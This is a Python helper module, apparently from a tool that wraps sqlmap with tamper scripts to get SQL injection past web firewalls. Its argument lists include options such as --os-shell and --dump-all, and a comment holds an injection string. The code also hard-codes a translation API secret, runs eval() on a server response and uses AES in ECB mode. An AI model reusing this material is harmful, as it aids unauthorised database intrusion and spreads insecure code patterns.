'application/wsdl+xml', 'application/wspolicy+xml', 'application/vnd.webturbo', 'video/x-ms-wvx', 'application/x-authorware-bin', 'model/x3d+xml', 'model/x3d+binary', 'model/x3d+binary', 'model/x3d+vrml', 'model/x3d+vrml', 'model/x3d+xml', 'application/xaml+xml', 'application/x-silverlight-app', 'application/vnd.xara', 'application/x-ms-xbap', 'application/vnd.fujixerox.docuworks.binder', 'image/x-xbitmap', 'application/xcap-diff+xml', 'application/vnd.syncml.dm+xml', 'application/vnd.adobe.xdp+xml', 'application/dssc+xml', 'application/vnd.fujixerox.docuworks', 'application/xenc+xml', 'application/patch-ops-error+xml', 'application/vnd.adobe.xfdf', 'application/vnd.xfdl', 'application/xhtml+xml', 'application/xhtml+xml', 'application/xv+xml', 'image/vnd.xiff', 'application/vnd.ms-excel', 'application/vnd.ms-excel.addin.macroenabled.12', 'application/vnd.ms-excel', 'application/x-xliff+xml', 'application/vnd.ms-excel', 'application/vnd.ms-excel', 'application/vnd.ms-excel.sheet.binary.macroenabled.12', 'application/vnd.ms-excel.sheet.macroenabled.12', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application/vnd.ms-excel', 'application/vnd.ms-excel.template.macroenabled.12', 'application/vnd.openxmlformats-officedocument.spreadsheetml.template', 'application/vnd.ms-excel', 'audio/xm', 'application/xml', 'application/vnd.olpc-sugar', 'application/xop+xml', 'application/x-xpinstall', 'application/xproc+xml', 'image/x-xpixmap', 'application/vnd.is-xpr', 'application/vnd.ms-xpsdocument', 'application/vnd.intercon.formnet', 'application/vnd.intercon.formnet', 'application/xml', 'application/xslt+xml', 'application/vnd.syncml+xml', 'application/xspf+xml', 'application/vnd.mozilla.xul+xml', 'application/xv+xml', 'application/xv+xml', 'image/x-xwindowdump', 'chemical/x-xyz', 'application/x-xz', 'application/yang', 'application/yin+xml', 'application/x-compress', 'application/x-compress', 'application/x-zmachine', 'application/x-zmachine', 'application/x-zmachine', 'application/x-zmachine', 'application/x-zmachine', 'application/x-zmachine', 'application/x-zmachine', 'application/x-zmachine', 'application/vnd.zzazz.deck+xml', 'application/zip', 'application/vnd.zul', 'application/vnd.zul', 'application/vnd.handheld-entertainment+xml']
domain_suf_list = ['.aaa', '.aarp', '.abarth', '.abb', '.abbott', '.abbvie', '.abc', '.able', '.abogado',
                   '.abudhabi', '.ac', '.academy', '.accenture', '.accountant', '.accountants', '.aco', '.active', '.actor',
                   '.ad', '.adac', '.ads', '.adult', '.ae', '.aeg', '.aero', '.aetna', '.af', '.afamilycompany', '.afl',
                   '.africa', '.ag', '.agakhan', '.agency', '.ai', '.aig', '.aigo', '.airbus', '.airforce', '.airtel',
                   '.akdn', '.al', '.alfaromeo', '.alibaba', '.alipay', '.allfinanz', '.allstate', '.ally', '.alsace',
                   '.alstom', '.am', '.americanexpress', '.americanfamily', '.amex', '.amfam', '.amica', '.amsterdam',
                   '.an', '.analytics', '.android', '.anquan', '.anz', '.ao', '.aol', '.apartments', '.app', '.apple',
                   '.aq', '.aquarelle', '.ar', '.aramco', '.archi', '.army', '.arpa', '.art', '.arte', '.as', '.asda',
                   '.asia', '.associates', '.at', '.athleta', '.attorney', '.au', '.auction', '.audi', '.audible', '.audio',
                   '.auspost', '.author', '.auto', '.autos', '.avianca', '.aw', '.aws', '.ax', '.axa', '.az', '.azure',
                   '.ba', '.baby', '.baidu', '.banamex', '.bananarepublic', '.band', '.bank', '.bar', '.barcelona',
                   '.barclaycard', '.barclays', '.barefoot', '.bargains', '.baseball', '.basketball', '.bauhaus', '.bayern',
                   '.bb', '.bbc', '.bbt', '.bbva', '.bcg', '.bcn', '.bd', '.be', '.beats', '.beauty', '.beer', '.bentley',
                   '.berlin', '.best', '.bestbuy', '.bet', '.bf', '.bg', '.bh', '.bharti', '.bi', '.bible', '.bid', '.bike',
                   '.bing', '.bingo', '.bio', '.biz', '.bj', '.bl', '.black', '.blackfriday', '.blanco', '.blockbuster',
                   '.blog', '.bloomberg', '.blue', '.bm', '.bms', '.bmw', '.bn', '.bnl', '.bnpparibas', '.bo', '.boats',
                   '.boehringer', '.bofa', '.bom', '.bond', '.boo', '.book', '.booking', '.boots', '.bosch', '.bostik',
                   '.boston', '.bot', '.boutique', '.box', '.bq', '.br', '.bradesco', '.bridgestone', '.broadway',
                   '.broker', '.brother', '.brussels', '.bs', '.bt', '.budapest', '.bugatti', '.build', '.builders',
                   '.business', '.buy', '.buzz', '.bv', '.bw', '.by', '.bz', '.bzh', '.ca', '.cab', '.cafe', '.cal',
                   '.call', '.calvinklein', '.cam', '.camera', '.camp', '.cancerresearch', '.canon', '.capetown',
                   '.capital', '.capitalone', '.car', '.caravan', '.cards', '.care', '.career', '.careers', '.cars',
                   '.cartier', '.casa', '.case', '.caseih', '.cash', '.casino', '.cat', '.catering', '.catholic', '.cba',
                   '.cbn', '.cbre', '.cbs', '.cc', '.cd', '.ceb', '.center', '.ceo', '.cern', '.cf', '.cfa', '.cfd', '.cg',
                   '.ch', '.chanel', '.channel', '.chase', '.chat', '.cheap', '.chintai', '.chloe', '.christmas', '.chrome',
                   '.chrysler', '.church', '.ci', '.cipriani', '.circle', '.cisco', '.citadel', '.citi', '.citic', '.city',
                   '.cityeats', '.ck', '.cl', '.claims', '.cleaning', '.click', '.clinic', '.clinique', '.clothing',
                   '.cloud', '.club', '.clubmed', '.cm', '.cn', '.co', '.coach', '.codes', '.coffee', '.college',
                   '.cologne', '.com', '.comcast', '.commbank', '.community', '.company', '.compare', '.computer',
                   '.comsec', '.condos', '.construction', '.consulting', '.contact', '.contractors', '.cooking',
                   '.cookingchannel', '.cool', '.coop', '.corsica', '.country', '.coupon', '.coupons', '.courses', '.cr',
                   '.credit', '.creditcard', '.creditunion', '.cricket', '.crown', '.crs', '.cruise', '.cruises', '.csc',
                   '.cu', '.cuisinella', '.cv', '.cw', '.cx', '.cy', '.cymru', '.cyou', '.cz', '.dabur', '.dad', '.dance',
                   '.data', '.date', '.dating', '.datsun', '.day', '.dclk', '.dds', '.de', '.deal', '.dealer', '.deals',
                   '.degree', '.delivery', '.dell', '.deloitte', '.delta', '.democrat', '.dental', '.dentist', '.desi',
                   '.design', '.dev', '.dhl', '.diamonds', '.diet', '.digital', '.direct', '.directory', '.discount',
                   '.discover', '.dish', '.diy', '.dj', '.dk', '.dm', '.dnp', '.do', '.docs', '.doctor', '.dodge', '.dog',
                   '.doha', '.domains', '.doosan', '.dot', '.download', '.drive', '.dtv', '.dubai', '.duck', '.dunlop',
                   '.duns', '.dupont', '.durban', '.dvag', '.dvr', '.dz', '.earth', '.eat', '.ec', '.eco', '.edeka', '.edu',
                   '.education', '.ee', '.eg', '.eh', '.email', '.emerck', '.energy', '.engineer', '.engineering',
                   '.enterprises', '.epost', '.epson', '.equipment', '.er', '.ericsson', '.erni', '.es', '.esq', '.estate',
                   '.esurance', '.et', '.eu', '.eurovision', '.eus', '.events', '.everbank', '.exchange', '.expert',
                   '.exposed', '.express', '.extraspace', '.fage', '.fail', '.fairwinds', '.faith', '.family', '.fan',
                   '.fans', '.farm', '.farmers', '.fashion', '.fast', '.fedex', '.feedback', '.ferrari', '.ferrero', '.fi',
                   '.fiat', '.fidelity', '.fido', '.film', '.final', '.finance', '.financial', '.fire', '.firestone',
                   '.firmdale', '.fish', '.fishing', '.fit', '.fitness', '.fj', '.fk', '.flickr', '.flights', '.flir',
                   '.florist', '.flowers', '.flsmidth', '.fly', '.fm', '.fo', '.foo', '.food', '.foodnetwork', '.football',
                   '.ford', '.forex', '.forsale', '.forum', '.foundation', '.fox', '.fr', '.free', '.fresenius', '.frl',
                   '.frogans', '.frontdoor', '.frontier', '.ftr', '.fujitsu', '.fujixerox', '.fun', '.fund', '.furniture',
                   '.futbol', '.fyi', '.ga', '.gal', '.gallery', '.gallo', '.gallup', '.game', '.games', '.gap', '.garden',
                   '.gb', '.gbiz', '.gd', '.gdn', '.ge', '.gea', '.gent', '.genting', '.george', '.gf', '.gg', '.ggee',
                   '.gh', '.gi', '.gift', '.gifts', '.gives', '.giving', '.gl', '.glade', '.glass', '.gle', '.global', '.globo',
                   '.gm', '.gmail', '.gmbh', '.gmo', '.gmx', '.gn', '.godaddy', '.gold', '.goldpoint', '.golf', '.goo',
                   '.goodhands', '.goodyear', '.goog', '.google', '.gop', '.got', '.gov', '.gp', '.gq', '.gr', '.grainger',
                   '.graphics', '.gratis', '.green', '.gripe', '.group', '.gs', '.gt', '.gu', '.guardian', '.gucci', '.guge',
                   '.guide', '.guitars', '.guru', '.gw', '.gy', '.hair', '.hamburg', '.hangout', '.haus', '.hbo', '.hdfc',
                   '.hdfcbank', '.health', '.healthcare', '.help', '.helsinki', '.here', '.hermes', '.hgtv', '.hiphop',
                   '.hisamitsu', '.hitachi', '.hiv', '.hk', '.hkt', '.hm', '.hn', '.hockey', '.holdings', '.holiday', '.homedepot',
                   '.homegoods', '.homes', '.homesense', '.honda', '.honeywell', '.horse', '.hospital', '.host', '.hosting', '.hot',
                   '.hoteles', '.hotmail', '.house', '.how', '.hr', '.hsbc', '.ht', '.htc', '.hu', '.hughes', '.hyatt', '.hyundai',
                   '.ibm', '.icbc', '.ice', '.icu', '.id', '.ie', '.ieee', '.ifm', '.iinet', '.ikano', '.il', '.im', '.imamat',
                   '.imdb', '.immo', '.immobilien', '.in', '.industries', '.infiniti', '.info', '.ing', '.ink', '.institute',
                   '.insurance', '.insure', '.int', '.intel', '.international', '.intuit', '.investments', '.io', '.ipiranga',
                   '.iq', '.ir', '.irish', '.is', '.iselect', '.ismaili', '.ist', '.istanbul', '.it', '.itau', '.itv', '.iveco',
                   '.iwc', '.jaguar', '.java', '.jcb', '.jcp', '.je', '.jeep', '.jetzt', '.jewelry', '.jio', '.jlc', '.jll', '.jm',
                   '.jmp', '.jnj', '.jo', '.jobs', '.joburg', '.jot', '.joy', '.jp', '.jpmorgan', '.jprs', '.juegos', '.juniper',
                   '.kaufen', '.kddi', '.ke', '.kerryhotels', '.kerrylogistics', '.kerryproperties', '.kfh', '.kg', '.kh', '.ki',
                   '.kia', '.kim', '.kinder', '.kindle', '.kitchen', '.kiwi', '.km', '.kn', '.koeln', '.komatsu', '.kosher', '.kp',
                   '.kpmg', '.kpn', '.kr', '.krd', '.kred', '.kuokgroup', '.kw', '.ky', '.kyoto', '.kz', '.la', '.lacaixa',
                   '.ladbrokes', '.lamborghini', '.lamer', '.lancaster', '.lancia', '.lancome', '.land', '.landrover', '.lanxess',
                   '.lasalle', '.lat', '.latino', '.latrobe', '.law', '.lawyer', '.lb', '.lc', '.lds', '.lease', '.leclerc',
                   '.lefrak', '.legal', '.lego', '.lexus', '.lgbt', '.li', '.liaison', '.lidl', '.life', '.lifeinsurance',
                   '.lifestyle', '.lighting', '.like', '.lilly', '.limited', '.limo', '.lincoln', '.linde', '.link', '.lipsy',
                   '.live', '.living', '.lixil', '.lk', '.loan', '.loans', '.locker', '.locus', '.loft', '.lol', '.london',
                   '.lotte', '.lotto', '.love', '.lpl', '.lplfinancial', '.lr', '.ls', '.lt', '.ltd', '.ltda', '.lu', '.lundbeck',
                   '.lupin', '.luxe', '.luxury', '.lv', '.ly', '.ma', '.macys', '.madrid', '.maif', '.maison', '.makeup', '.man',
                   '.management', '.mango', '.market', '.marketing', '.markets', '.marriott', '.marshalls', '.maserati', '.mattel',
                   '.mba', '.mc', '.mcd', '.mcdonalds', '.mckinsey', '.md', '.me', '.med', '.media', '.meet', '.melbourne', '.meme',
                   '.memorial', '.men', '.menu', '.meo', '.metlife', '.mf', '.mg', '.mh', '.miami', '.microsoft', '.mil', '.mini',
                   '.mint', '.mit', '.mitsubishi', '.mk', '.ml', '.mlb', '.mls', '.mm', '.mma', '.mn', '.mo', '.mobi', '.mobile',
                   '.mobily', '.moda', '.moe', '.moi', '.mom', '.monash', '.money', '.monster', '.montblanc', '.mopar', '.mormon',
                   '.mortgage', '.moscow', '.moto', '.motorcycles', '.mov', '.movie', '.movistar', '.mp', '.mq', '.mr', '.ms',
                   '.msd', '.mt', '.mtn', '.mtpc', '.mtr', '.mu', '.museum', '.mutual', '.mutuelle', '.mv', '.mw', '.mx', '.my',
                   '.mz', '.na', '.nab', '.nadex', '.nagoya', '.name', '.nationwide', '.natura', '.navy', '.nba', '.nc', '.ne',
                   '.nec', '.net', '.netbank', '.netflix', '.network', '.neustar', '.new', '.newholland', '.news', '.next',
                   '.nextdirect', '.nexus', '.nf', '.nfl', '.ng', '.ngo', '.nhk', '.ni', '.nico', '.nike', '.nikon', '.ninja',
                   '.nissan', '.nissay', '.nl', '.no', '.nokia', '.northwesternmutual', '.norton', '.now', '.nowruz', '.nowtv',
                   '.np', '.nr', '.nra', '.nrw', '.ntt', '.nu', '.nyc', '.nz', '.obi', '.observer', '.off', '.office', '.okinawa',
                   '.olayan', '.olayangroup', '.oldnavy', '.ollo', '.om', '.omega', '.one', '.ong', '.onl', '.online',
                   '.onyourside', '.ooo', '.open', '.oracle', '.orange', '.org', '.organic', '.orientexpress', '.origins', '.osaka',
                   '.otsuka', '.ott', '.ovh', '.pa', '.page', '.pamperedchef', '.panasonic', '.panerai', '.paris', '.pars',
                   '.partners', '.parts', '.party', '.passagens', '.pay', '.pccw', '.pe', '.pet', '.pf', '.pfizer', '.pg', '.ph',
                   '.pharmacy', '.philips', '.phone', '.photo', '.photography', '.photos', '.physio', '.piaget', '.pics', '.pictet',
                   '.pictures', '.pid', '.pin', '.ping', '.pink', '.pioneer', '.pizza', '.pk', '.pl', '.place', '.play',
                   '.playstation', '.plumbing', '.plus', '.pm', '.pn', '.pnc', '.pohl', '.poker', '.politie', '.porn', '.post',
                   '.pr', '.pramerica', '.praxi', '.press', '.prime', '.pro', '.prod', '.productions', '.prof', '.progressive',
                   '.promo', '.properties', '.property', '.protection', '.pru', '.prudential', '.ps', '.pt', '.pub', '.pw', '.pwc',
                   '.py', '.qa', '.qpon', '.quebec', '.quest', '.qvc', '.racing', '.radio', '.raid', '.re', '.read', '.realestate',
                   '.realtor', '.realty', '.recipes', '.red', '.redstone', '.redumbrella', '.rehab', '.reise', '.reisen', '.reit',
                   '.reliance', '.ren', '.rent', '.rentals', '.repair', '.report', '.republican', '.rest', '.restaurant', '.review',
                   '.reviews', '.rexroth', '.rich', '.richardli', '.ricoh', '.rightathome', '.ril', '.rio', '.rip', '.rmit', '.ro',
                   '.rocher', '.rocks', '.rodeo', '.rogers', '.room', '.rs', '.rsvp', '.ru', '.ruhr', '.run', '.rw', '.rwe',
                   '.ryukyu', '.sa', '.saarland', '.safe', '.safety', '.sakura', '.sale', '.salon', '.samsclub', '.samsung',
                   '.sandvik', '.sandvikcoromant', '.sanofi', '.sap', '.sapo', '.sarl', '.sas', '.save', '.saxo', '.sb', '.sbi',
                   '.sbs', '.sc', '.sca', '.scb', '.schaeffler', '.schmidt', '.scholarships', '.school', '.schule', '.schwarz',
                   '.science', '.scjohnson', '.scor', '.scot', '.sd', '.se', '.seat', '.secure', '.security', '.seek', '.select',
                   '.sener', '.services', '.ses', '.seven', '.sew', '.sex', '.sexy', '.sfr', '.sg', '.sh', '.shangrila', '.sharp',
                   '.shaw', '.shell', '.shia', '.shiksha', '.shoes', '.shop', '.shopping', '.shouji', '.show', '.showtime',
                   '.shriram', '.si', '.silk', '.sina', '.singles', '.site', '.sj', '.sk', '.ski', '.skin', '.sky', '.skype', '.sl',
                   '.sling', '.sm', '.smart', '.smile', '.sn', '.sncf', '.so', '.soccer', '.social', '.softbank', '.software',
                   '.sohu', '.solar', '.solutions', '.song', '.sony', '.soy', '.space', '.spiegel', '.spot', '.spreadbetting',
                   '.sr', '.srl', '.srt', '.ss', '.st', '.stada', '.staples', '.star', '.starhub', '.statebank', '.statefarm',
                   '.statoil', '.stc', '.stcgroup', '.stockholm', '.storage', '.store', '.stream', '.studio', '.study', '.style',
                   '.su', '.sucks', '.supplies', '.supply', '.support', '.surf', '.surgery', '.suzuki', '.sv', '.swatch',
                   '.swiftcover', '.swiss', '.sx', '.sy', '.sydney', '.symantec', '.systems', '.sz', '.tab', '.taipei', '.talk',
                   '.taobao', '.target', '.tatamotors', '.tatar', '.tattoo', '.tax', '.taxi', '.tc', '.tci', '.td', '.tdk', '.team',
                   '.tech', '.technology', '.tel', '.telecity', '.telefonica', '.temasek', '.tennis', '.teva', '.tf', '.tg', '.th',
                   '.thd', '.theater', '.theatre', '.tiaa', '.tickets', '.tienda', '.tiffany', '.tips', '.tires', '.tirol', '.tj',
                   '.tjmaxx', '.tjx', '.tk', '.tkmaxx', '.tl', '.tm', '.tmall', '.tn', '.to', '.today', '.tokyo', '.tools', '.top',
                   '.toray', '.toshiba', '.total', '.tours', '.town', '.toyota', '.toys', '.tp', '.tr', '.trade', '.trading',
                   '.training', '.travel', '.travelchannel', '.travelers', '.travelersinsurance', '.trust', '.trv', '.tt', '.tube',
                   '.tui', '.tunes', '.tushu', '.tv', '.tvs', '.tw', '.tz', '.ua', '.ubank', '.ubs', '.uconnect', '.ug', '.uk',
                   '.um', '.unicom', '.university', '.uno', '.uol', '.ups', '.us', '.uy', '.uz', '.va', '.vacations', '.vana',
                   '.vanguard', '.vc', '.ve', '.vegas', '.ventures', '.verisign', '.versicherung', '.vet', '.vg', '.vi', '.viajes',
                   '.video', '.vig', '.viking', '.villas', '.vin', '.vip', '.virgin', '.visa', '.vision', '.vista', '.vistaprint',
                   '.viva', '.vivo', '.vlaanderen', '.vn', '.vodka', '.volkswagen', '.volvo', '.vote', '.voting', '.voto',
                   '.voyage', '.vu', '.vuelos', '.wales', '.walmart', '.walter', '.wang', '.wanggou', '.warman', '.watch',
                   '.watches', '.weather', '.weatherchannel', '.webcam', '.weber', '.website', '.wed', '.wedding', '.weibo',
                   '.weir', '.wf', '.whoswho', '.wien', '.wiki', '.williamhill', '.win', '.windows', '.wine', '.winners', '.wme',
                   '.wolterskluwer', '.woodside', '.work', '.works', '.world', '.wow', '.ws', '.wtc', '.wtf', '.xbox', '.xerox',
                   '.xfinity', '.xihuan', '.xin', '.xperia', '.xxx', '.xyz', '.yachts', '.yahoo', '.yamaxun', '.yandex', '.ye', '.yodobashi', '.yoga', '.yokohama', '.you', '.youtube', '.yt', '.yun', '.za', '.zappos', '.zara', '.zero', '.zip', '.zippo', '.zm', '.zone', '.zuerich', '.zw']


def baidu_translate(content):
    #百度翻译,比下面的有道翻译好用,翻译的结果更准
    import http.client
    import hashlib
    import json
    import urllib
    import random
    try_count=0
    while True:
        try_count+=1
        if try_count>=6:
            #尝试5次
            return "百度翻译失败"
        appid = '20151113000005349'
        secretKey = 'osubCEzlGjzvw8qdQc41'
        myurl = 'http://api.fanyi.baidu.com/api/trans/vip/translate'
        q = content
        fromLang = 'en' # 源语言
        toLang = 'zh'   # 翻译后的语言
        salt = random.randint(32768, 65536)
        sign = appid + q + str(salt) + secretKey
        sign = hashlib.md5(sign.encode()).hexdigest()
        myurl = myurl + '?appid=' + appid + '&q=' + urllib.parse.quote(
            q) + '&from=' + fromLang + '&to=' + toLang + '&salt=' + str(
            salt) + '&sign=' + sign
     
        try:
            rsp=requests.get(myurl)
            jsonResponse = rsp.content.decode("utf-8")# 获得返回的结果，结果为json格式
            js = json.loads(jsonResponse)  # 将json格式的结果转换字典结构
            dst = str(js["trans_result"][0]["dst"])  # 取得翻译后的文本结果
            return dst # 打印结果
        except Exception as e:
            #print(e)
            pass
        time.sleep(1)
     

def translate(word):
    # 有道词典 api
    import json
    import requests
    url = 'http://fanyi.youdao.com/translate?smartresult=dict&smartresult=rule&smartresult=ugc&sessionFrom=null'
    # 传输的参数，其中 i 为需要翻译的内容
    key = {
        'type': "AUTO",
        'i': word,
        "doctype": "json",
        "version": "2.1",
        "keyfrom": "fanyi.web",
        "ue": "UTF-8",
        "action": "FY_BY_CLICKBUTTON",
        "typoResult": "true"
    }
    # key 这个字典为发送给有道词典服务器的内容
    response = requests.post(url, data=key)
    # 判断服务器是否相应成功
    if response.status_code == 200:
        # 然后相应的结果
        result=response.text
        result=result.replace("true","'true'")
        result=result.replace("false","'false'")
        result=result.replace("null","'null'")
        tgt_list=re.findall(r'''('|")tgt('|"): ?('|")([^\{\}]+)('|")}''',str(eval(result)))
        return_value="".join([each[3] for each in tgt_list])
        return return_value

    else:
        return "有道词典调用失败"



def combile_my_para_and_argv_para(command):
    import sys
    import re
    '''
    try:
        options,args=getopt.getopt(sys.argv[1:],"u:v:",["batch","random-agent","smart","user-agent=","referer","level=","tamper=","proxy=","threads=","dbms=",])
    '''

    single_argv_list = ["--drop-set-cookie", "--random-agent", "--ignore-proxy", "--ignore-redirects", "--ignore-timeouts", "--skip-urlencode", "-b", "--banner", "--current-user", "--current-db", "--is-dba", "--users", "--passwords", "--privileges", "--roles", "--dbs", "--tables", "--exclude-sysdbs", "--columns", "--schema", "--count", "--dump", "--dump-all", "--sql-shell", "--common-tables", "--common-columns", "--os-shell", "--os-pwn", "--os-smbrelay", "--os-bof", "--batch", "--eta", "--flush-session", "--forms", "--fresh-queries", "--hex",
                        "--no-cast", "--parse-errors", "--alert", "--beep", "--check-waf", "--cleanup", "--disable-coloring", "-hpp", "--identify-waf", "--purge-output", "--smart", "--wizard", "-h", "--help", "-hh", "--version", "--ignore-401", "--tor", "--check-tor", "--force-ssl", "-o", "--predict-output", "--keep-alive", "--null-connection", "--skip-static", "--no-escape", "-f", "--fingerprint", "-a", "--all", "--hostname", "--comments", "--priv-esc", "--reg-read", "--reg-add", "--reg-del", "--update", "--dependencies", "--offline", "--skip-waf", "--sqlmap-shell"]
    double_argv_list = ["-v", "-u", "--url", "--threads", "-l", "-m", "-r", "-g", "--data", "--param-del", "--cookie", "--cookie-del", "--load-cookies", "--level", "--user-agent", "--referer", "--headers", "--host", "-H", "--auth-type", "--auth-cred", "--auth-cert", "--auth-file", "--proxy", "--proxy-cred", "--proxy-file", "--delay", "--timeout", "--retries", "--randomize", "--scope", "--safe-url", "--safe-post", "--safe-req", "--safe-freq", "--eval", "-p", "--skip", "--dbms", "--os", "--invalid-bignum", "--invalid-logical", "--invalid-string", "--prefix", "--suffix", "--tamper", "--risk", "--string", "--not-string", "--regexp", "--code", "--text-only", "--titles", "--technique", "--time-sec", "--union-cols", "--union-char",
                        "--union-from", "--second-order", "-D", "-X", "-T", "-C", "--start", "--stop", "--first", "--last", "--search", "--sql-query", "--sql-file", "--udf-inject", "--shared-lib", "--file-read", "--file-write", "--file-dest", "--os-cmd", "--reg-key", "--reg-value", "--reg-data", "--reg-type", "-s", "-t", "--charset", "--crawl", "--crawl-exclude", "--csv-del", "--dbms-cred", "--dump-format", "--output-dir", "-z", "--answers", "--gpage", "--mobile", "-d", "-x", "-c", "--method", "--tor-port", "--tor-type", "--csrf-token", "--csrf-url", "--param-exclude", "--dns-domain", "-U", "--pivot-column", "--where", "--msf-path", "--tmp-path", "-s", "-t", "--binary-fields", "--save", "--test-filter", "--test-skip", "--tmp-dir", "--web-root"]
    command_list = string2argv(command)
    print(command_list)

    argv_list = param2argv(sys.argv[1:])
    # print(argv_list)

    final_command = ""
    argv_index = 0
    noneed_param = ""
    for each in argv_list:
        if each in command_list:
            if each in single_argv_list:
                final_command += (" " +
                                  each if " " not in each else '"' + each + '"')
                pass
            elif each in double_argv_list:
                final_command += (" " +
                                  each if " " not in each else '"' + each + '"')
                tmp = argv_list[argv_index + 1]
                final_command += (" " +
                                  (tmp if " " not in tmp else '"' + tmp + '"'))
                noneed_param = argv_list[argv_index + 1]
                pass
            else:
                pass
        else:
            if each in single_argv_list:
                final_command += (" " +
                                  each if " " not in each else '"' + each + '"')
                pass
            elif each in double_argv_list:
                if each == "--suffix":
                    print(final_command)

                final_command += (" " +
                                  each if " " not in each else '"' + each + '"')
                tmp = argv_list[argv_index + 1]
                # patch or --suffix " or '1'='1"
                if " " in tmp:
                    tmp = tmp.replace(" ", "xxxxx")
                final_command += (" " +
                                  (tmp if "xxxxx" not in tmp else tmp))
                noneed_param = argv_list[argv_index + 1]
                pass

            elif each != noneed_param:
                final_command += (" " +
                                  each if " " not in each else '"' + each + '"')
                pass
        argv_index += 1

    command_index = 0
    noneed_param = ""
    for each in command_list:
        if each in argv_list and each != noneed_param:
            if each in single_argv_list:

                pass
            elif each in double_argv_list:
                noneed_param = command_list[command_index + 1]

                pass
            else:
                pass
        else:
            if each in single_argv_list:
                final_command += (" " +
                                  each if " " not in each else '"' + each + '"')
                pass
            elif each in double_argv_list:
                final_command += (" " +
                                  each if " " not in each else '"' + each + '"')
                tmp = command_list[command_index + 1]
                final_command += (" " +
                                  (tmp if " " not in tmp else '"' + tmp + '"'))
                pass
            else:
                # 这种情况不可能,除非我在代码中用到的sqlmap参数是不正确的
                pass
        command_index += 1
    # print(command_list)

    if "--tamper" in argv_list:
        argv_list_tamper_list = []
        command_list_tamper_list = []
        argv_index = 0
        command_index = 0
        for each in argv_list:
            if each == "--tamper":
                argv_list_tamper_string = argv_list[argv_index + 1]
            argv_index += 1
        if "," not in argv_list_tamper_string:
            # argv的tamper参数的值有1个tamper
            argv_list_tamper_list.append(argv_list_tamper_string)
        else:
            # argv的tamper参数的值有多个tamper
            argv_list_tamper_list = argv_list_tamper_string.split(",")
        # 到这里得到argv传入tamper参数中的tamper列表

        # 2017/08/30新增
        command_list_tamper_string = ""
        for each in command_list:
            if each == "--tamper":
                command_list_tamper_string = command_list[command_index + 1]
            command_index += 1
        if "," not in command_list_tamper_string:
            command_list_tamper_list.append(command_list_tamper_string)
        else:
            command_list_tamper_list = command_list_tamper_string.split(",")
        # 到这里得到我的xwaf.py内置的tamper方案中的tamper列表

        final_tamper = ""
        for each_tamper in argv_list_tamper_list:
            final_tamper += (each_tamper + ",")
        for each_tamper in command_list_tamper_list:
            if each_tamper not in argv_list_tamper_list:
                final_tamper += (each_tamper + ",")
        if final_tamper[-1] == ",":
            final_tamper = final_tamper[:-1]
        final_command = re.sub(r"--tamper[\s]+[^\s]+", "", final_command)
        final_command += (" --tamper" + " " + final_tamper)
    else:
        pass

    # 1

    final_command_list = final_command[1:].split(" ")

    tmp_list = []
    for each in final_command_list:
        if each != "" and each[0] != "-":
            tmp_list.append(' "' + each + '"')
        else:
            tmp_list.append(' ' + each)
    final_command = "".join(tmp_list)
    # 1

    final_command = "python2 /usr/share/sqlmap/sqlmap.py" + final_command
    if "xxxxx" in final_command:
        final_command = final_command.replace("xxxxx", " ")
    return final_command

# str不是16的倍数那就补足为16的倍数
def add_to_16(value):
    while len(value) % 16 != 0:
        value += '\0'
    return str.encode(value)  # 返回bytes

#加密方法
def aes_enc(text,key):
    from Crypto.Cipher import AES
    # 初始化加密器
    aes = AES.new(add_to_16(key), AES.MODE_ECB)
    #先进行aes加密
    encrypt_aes = aes.encrypt(add_to_16(text))
    #用base64转成字符串形式
    encrypted_text = str(base64.encodebytes(encrypt_aes), encoding='utf-8')  # 执行加密并转码返回bytes
    return encrypted_text

#解密方法
def aes_dec(text,key):
    # 初始化加密器
    from Crypto.Cipher import AES
    aes = AES.new(add_to_16(key), AES.MODE_ECB)
    #优先逆向解密base64成bytes
    base64_decrypted = base64.decodebytes(text.encode(encoding='utf-8'))
    #
    decrypted_text = str(aes.decrypt(base64_decrypted),encoding='utf-8') # 执行解密密并转码返回str
    decrypted_text=decrypted_text.rstrip('\0')
    return decrypted_text

def get_md5(string):
    from hashlib import md5
    return md5(string.encode('utf8')).hexdigest()

def get_sha1(string):
    from hashlib import sha1
    s1=sha1()
    s1.update(string.encode('utf8'))
    return s1.hexdigest()

def get_js_sha1(string):
    #js在处理中文的sha1时与python等其他语言得到的结果不一样,要单独处理
    import execjs
    js=''' function add(x, y) {
	return((x & 0x7FFFFFFF) + (y & 0x7FFFFFFF)) ^ (x & 0x80000000) ^ (y & 0x80000000);
}
 
function SHA1hex(num) {
	var sHEXChars = "0123456789abcdef";
	var str = "";
	for(var j = 7; j >= 0; j--)
		str += sHEXChars.charAt((num >> (j * 4)) & 0x0F);
	return str;
}
 
function AlignSHA1(sIn) {
	var nblk = ((sIn.length + 8) >> 6) + 1,
		blks = new Array(nblk * 16);
	for(var i = 0; i < nblk * 16; i++) blks[i] = 0;
	for(i = 0; i < sIn.length; i++)
		blks[i >> 2] |= sIn.charCodeAt(i) << (24 - (i & 3) * 8);
	blks[i >> 2] |= 0x80 << (24 - (i & 3) * 8);
	blks[nblk * 16 - 1] = sIn.length * 8;
	return blks;
}
 
function rol(num, cnt) {
	return(num << cnt) | (num >>> (32 - cnt));
}
 
function ft(t, b, c, d) {
	if(t < 20) return(b & c) | ((~b) & d);
	if(t < 40) return b ^ c ^ d;
	if(t < 60) return(b & c) | (b & d) | (c & d);
	return b ^ c ^ d;
}
 
function kt(t) {
	return(t < 20) ? 1518500249 : (t < 40) ? 1859775393 :
		(t < 60) ? -1894007588 : -899497514;
}
 
function SHA1(sIn) {
	var x = AlignSHA1(sIn);
	var w = new Array(80);
	var a = 1732584193;
	var b = -271733879;
	var c = -1732584194;
	var d = 271733878;
	var e = -1009589776;
	for(var i = 0; i < x.length; i += 16) {
		var olda = a;
		var oldb = b;
		var oldc = c;
		var oldd = d;
		var olde = e;
		for(var j = 0; j < 80; j++) {
			if(j < 16) w[j] = x[i + j];
			else w[j] = rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1);
			t = add(add(rol(a, 5), ft(j, b, c, d)), add(add(e, w[j]), kt(j)));
			e = d;
			d = c;
			c = rol(b, 30);
			b = a;
			a = t;
		}
		a = add(a, olda);
		b = add(b, oldb);
		c = add(c, oldc);
		d = add(d, oldd);
		e = add(e, olde);
	}
	SHA1Value = SHA1hex(a) + SHA1hex(b) + SHA1hex(c) + SHA1hex(d) + SHA1hex(e);
	return SHA1Value.toLowerCase();
} '''
